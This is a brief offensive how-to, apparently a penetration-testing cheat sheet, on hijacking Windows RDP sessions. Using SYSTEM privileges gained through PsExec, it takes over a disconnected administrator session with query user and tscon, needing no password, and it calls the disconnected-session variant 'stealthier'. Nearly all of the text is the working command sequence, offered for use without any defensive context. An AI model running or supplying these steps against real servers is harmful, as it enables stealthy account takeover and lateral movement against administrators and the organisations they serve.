### When an administrator uses Remote Desktop to connect to a machine and closes RDP client instead of logging off, his session will remain open on the server INDEFINITELY!

### If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

#### 1) 

    cmd.exe (as administrator)

#### 2) 

    PsExec64.exe -s cmd.exe

#### 3) 

    query user

#### 4) Takeover sessions with disc state (stealthier)

#### 

    tscon SESSION_NUM /dest:SESSION_NAME
